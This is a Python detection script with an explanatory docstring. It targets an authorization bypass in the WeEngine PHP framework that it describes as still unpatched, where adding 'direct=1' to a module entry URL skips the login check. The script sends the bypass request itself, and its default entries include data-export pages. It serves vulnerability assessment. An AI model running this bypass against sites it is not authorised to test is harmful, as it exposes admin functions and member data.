#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WE7-5 — Unauthenticated invocation of a module backend entry  (still live in 2.9.13)
====================================================================================
Type      : CWE-862 Missing Authorization
            (also CWE-306 Missing Authentication for Critical Function)
Component : web/source/site/entry.ctrl.php
Affected  : 1.7.2 – 2.9.13 (current release, IMS_RELEASE_DATE 202610280001)
Severity  : High — every module method that the module implements but does not
            declare as a binding becomes callable without a session; impact is
            module-dependent (config/credential writes, record create/delete,
            bulk export of member data)

Why it works
------------
The controller looks the entry up in `modules_bindings`; **if no row matches it
builds one from the request**, including the authorization flag:

    'direct' => !empty($_GPC['direct']) ? safe_gpc_string($_GPC['direct']) : 0

and the only gate in the whole flow is

    if (!$entry['direct']) { checklogin(); ... }

so `direct=1` skips login, account and module permission checks, after which

    $method = 'doWeb' . ucfirst($entry['do']);
    exit($site->$method());

calls the module method directly. Bindings are generated from the module's
manifest `<bindings>` section, therefore the exposed surface is every `doWeb*`
method that is **not** declared there (exports, batch operations, cache/token
maintenance, diagnostics) plus every module that declares no bindings at all.

2.9.13 only added `safe_gpc_string()` (an XSS/trim filter) around the value.
The authorization logic is unchanged.

Detection method (NON-DESTRUCTIVE)
----------------------------------
Differential test per (module, entry):

    GET ...&m=<module>&do=<entry>&direct=0   -> must be blocked (302 / login)
    GET ...&m=<module>&do=<entry>&direct=1   -> if it returns 200 with a real
                                                page, the gate was bypassed

Both requests are plain GETs to pages you name explicitly; the script never
submits forms, never creates or deletes anything. Choose read-only entries
(e.g. exports, diagnostics, list pages).

Exit codes: 0 = not vulnerable · 1 = vulnerable · 2 = inconclusive

Usage:
    python3 we7_5_module_entry_bypass.py -u http://127.0.0.1:8084 -m xiaof_toupiao
    python3 we7_5_module_entry_bypass.py -u https://target -m some_module -d diagnose -d lists
    python3 we7_5_module_entry_bypass.py -u https://target -m m1 -m m2 --json
"""

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0 Safari/537.36")

# entries that are usually NOT declared in <bindings> and are read-only
DEFAULT_DOS = ["diagnose", "excle", "excletop", "excledraw", "lists", "list", "setting"]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """keep the 3xx visible: the framework answers the protected path with a redirect"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


opener = urllib.request.build_opener(NoRedirect)


def http_get(url, timeout=15):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(300000)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), (e.read(300000) if e.fp else b"")
    except Exception as e:
        return None, {}, str(e).encode()


def gate_fired(status, headers, body):
    """Did the framework stop us?
    WeEngine's checklogin() either redirects (302 -> c=user&a=login, or simply the
    site root) or renders a password form. Any 3xx / tiny body / password form
    counts as 'the gate fired'; the location is not relied upon because it differs
    between versions (1.7.x -> c=user&a=login, 2.x -> the site root)."""
    if status in (301, 302, 303, 307):
        return True
    low = body[:6000].lower()
    if b'type="password"' in low or b'name="password"' in low:
        return True
    return len(body) < 200


WE7_MARKERS = ("微擎", "we7.cc", "w7.cc", "c=site", "web/index.php?c=")
DENY_PHRASES = ("没有权限", "无权", "非法访问", "您没有权限", "permission denied",
                "not authorized", "unauthorized", "access denied", "forbidden")


def is_we7_page(body):
    """The rendered page must carry WeEngine-specific markers; a generic HTML
    page from some other application must not pass for a module admin page."""
    text = body.decode("utf-8", "replace")
    return any(m in text for m in WE7_MARKERS)


def is_deny_page(body):
    """A 200 'you are not allowed' page is still a denial, not a bypass."""
    text = body.decode("utf-8", "replace")
    return any(p in text for p in DENY_PHRASES)


def entry_url(base, module, do, direct, extra=None):
    q = {"c": "site", "a": "entry", "m": module, "do": do, "direct": direct}
    if extra:
        q.update(extra)
    return f"{base.rstrip('/')}/web/index.php?{urllib.parse.urlencode(q)}"


def probe_pair(base, module, do, timeout=15):
    s0, h0, b0 = http_get(entry_url(base, module, do, 0), timeout)
    s1, h1, b1 = http_get(entry_url(base, module, do, 1), timeout)
    gated = gate_fired(s0, h0, b0)          # the framework stopped us without direct
    still_gated = gate_fired(s1, h1, b1)    # ... and also stopped us with direct
    # VULNERABLE only if the gate fired without `direct` and a real WeEngine page
    # came back with `direct`. A non-HTML body (e.g. a CSV export with
    # Content-Disposition) also proves the method ran, since a login wall never
    # returns a data file.
    ct = (h1.get("Content-Type") or "").lower()
    has_markup = b"<" in b1[:2000]
    # A non-HTML body (CSV/JSON/binary download, or plain text without markup)
    # proves the method actually ran: a login wall never returns data.
    is_data_response = ((bool(ct) and "text/html" not in ct) or not has_markup) and len(b1) > 100
    reached = (s1 == 200 and len(b1) > 100 and not still_gated
               and not is_deny_page(b1)
               and (is_we7_page(b1) or is_data_response))
    if gated and reached:
        verdict = "VULNERABLE (direct=1 bypassed the login gate)"
    elif still_gated:
        verdict = "protected (a binding row exists -> checklogin() is enforced)"
    elif s1 == 200 and not gated:
        verdict = "inconclusive (no gate seen even with direct=0 - not a WeEngine admin surface?)"
    else:
        verdict = "inconclusive"
    return {"module": module, "do": do,
            "direct=0": {"status": s0, "bytes": len(b0)},
            "direct=1": {"status": s1, "bytes": len(b1),
                         "content_type": h1.get("Content-Type", "")},
            "verdict": verdict,
            "sample_title": _title(b1)}


def _title(body):
    try:
        text = body.decode("utf-8", "replace")
        i = text.lower().find("<title>")
        if i >= 0:
            return text[i + 7:text.lower().find("</title>", i)][:60]
    except Exception:
        pass
    return ""


def check(base, modules, dos, timeout=15):
    rows = [probe_pair(base, m, d, timeout) for m in modules for d in dos]
    vuln = [f"{r['module']}?do={r['do']}" for r in rows if r["verdict"].startswith("VULNERABLE")]
    return {"target": base, "check": "WE7-5 module entry bypass", "rows": rows,
            "vulnerable": vuln,
            "verdict": "VULNERABLE" if vuln else "no bypass observed"}


def main():
    ap = argparse.ArgumentParser(description="WE7-5 detector (non-destructive, GET only)")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-m", "--module", action="append", default=[], help="installed module name (repeatable)")
    ap.add_argument("-d", "--do", action="append", default=[], help="entry name (repeatable)")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()

    base = a.url if "://" in a.url else "http://" + a.url
    if not a.module:
        print("[!] 需要一个已安装的模块名：-m <module>（可从 WE7-4 的模块枚举结果里拿，或问站点管理员）")
        print("    example: python3 we7_5_module_entry_bypass.py -u http://127.0.0.1:8084 -m xiaof_toupiao")
        return 2

    r = check(base, a.module, a.do or DEFAULT_DOS, a.timeout)
    if a.json:
        print(json.dumps(r, ensure_ascii=False, indent=2))
    else:
        print(f"[WE7-5] {r['target']}")
        print(f"  type    : CWE-862 missing authorization  (still live in 2.9.13)")
        print(f"  affected: 1.7.2 - 2.9.13")
        print()
        for row in r["rows"]:
            print(f"  {row['module']}?do={row['do']:<12} "
                  f"direct=0 -> {row['direct=0']['status']:<3} | "
                  f"direct=1 -> {row['direct=1']['status']:<3} | {row['verdict']}")
        print()
        print(f"  summary : {r['verdict']}")
        if r["vulnerable"]:
            print(f"  exposed : {', '.join(r['vulnerable'])}")
    return 1 if r["vulnerable"] else 0


if __name__ == "__main__":
    sys.exit(main())
